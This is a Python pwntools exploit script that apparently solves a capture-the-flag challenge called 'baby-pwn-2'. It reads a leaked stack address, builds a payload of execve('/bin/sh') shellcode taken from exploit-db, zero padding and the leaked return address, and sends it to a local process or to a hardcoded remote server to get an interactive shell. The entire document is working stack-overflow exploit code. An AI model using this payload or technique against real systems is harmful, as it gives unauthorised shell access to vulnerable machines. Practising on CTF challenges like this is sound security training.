from pwn import *

# nc 34.162.119.16 5000
local = False

offset = 72
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
#shellcode snagged here https://www.exploit-db.com/exploits/46907
fill = b'\x00' * (offset -  len(shellcode)) #nop the rest of the buffer

if local:

	elf = context.binary = ELF('./baby-pwn-2')
	p = process()

	p.recvuntil('leak: ')
	buff_address_leak = int(p.recvline(), 16)
	print(hex(buff_address_leak))

	payload = shellcode + fill + p64(buff_address_leak)
	with open("payload", "wb") as f:
	    f.write(payload)

	p.sendline(payload)
	p.interactive()

else:
	conn = remote('34.162.119.16', 5000)
	conn.recvuntil('leak: ')
	buff_address_leak = int(conn.recvline(), 16)
	print(hex(buff_address_leak))
	payload = shellcode + fill + p64(buff_address_leak)
	conn.sendline(payload)
	conn.interactive()


